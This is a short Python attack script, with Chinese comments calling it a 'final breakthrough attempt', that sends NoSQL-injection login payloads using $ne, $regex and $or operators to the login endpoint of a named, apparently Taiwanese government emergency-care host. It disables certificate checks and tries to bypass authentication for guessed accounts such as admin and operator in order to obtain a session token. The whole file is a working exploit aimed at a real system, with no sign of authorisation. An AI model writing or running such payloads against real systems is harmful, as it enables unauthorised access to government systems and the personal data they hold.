import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"

print("=== 最终突破尝试: 构造多文档 + source 宽泛匹配 ===")
# 思路: username 宽泛(多文档) + source 宽泛(匹配白名单) -> 若成功返回 token(200)
tests=[
  ("username-ne + source-ne",
   {"username":{"$ne":None},"source":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}),
  ("username-ne + source-regex-empty",
   {"username":{"$ne":None},"source":{"$regex":""},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}),
  ("username-ne + source-regex-dot",
   {"username":{"$ne":None},"source":{"$regex":"."},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}),
  ("username-or + source-ne",
   {"username":{"$or":[{"username":"admin"},{"username":"tpf"},{"username":"operator"}]},"source":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}),
  ("only-source-ne",
   {"source":{"$ne":None},"username":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}),
  ("source-regex-all + username-ne",
   {"username":{"$ne":None},"source":{"$regex":"^.*$"},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}),
]
for name, body in tests:
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    try:
        s.get(BASE+"/captcha",timeout=10)
        r=s.post(BASE+"/login", json=body, timeout=10)
        print(f"  {name:35s} -> {r.status_code} {r.text[:70]}")
    except Exception as e:
        print(f"  {name:35s} -> ERR {repr(e)[:40]}")
    time.sleep(0.1)

print("\n=== 测试: 精确匹配存在的用户 + NoSQL source (绕过source) ===")
# 若用户存在且 source 可用 NoSQL 匹配白名单
for u in ["admin","tpf","operator","epcr","dispatch"]:
    body={"username":u,"source":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    try:
        s.get(BASE+"/captcha",timeout=10)
        r=s.post(BASE+"/login", json=body, timeout=10)
        print(f"  {u:12s}+source-ne -> {r.status_code} {r.text[:60]}")
    except Exception as e:
        print(f"  {u:12s} -> ERR {repr(e)[:30]}")
    time.sleep(0.08)
print("DONE")
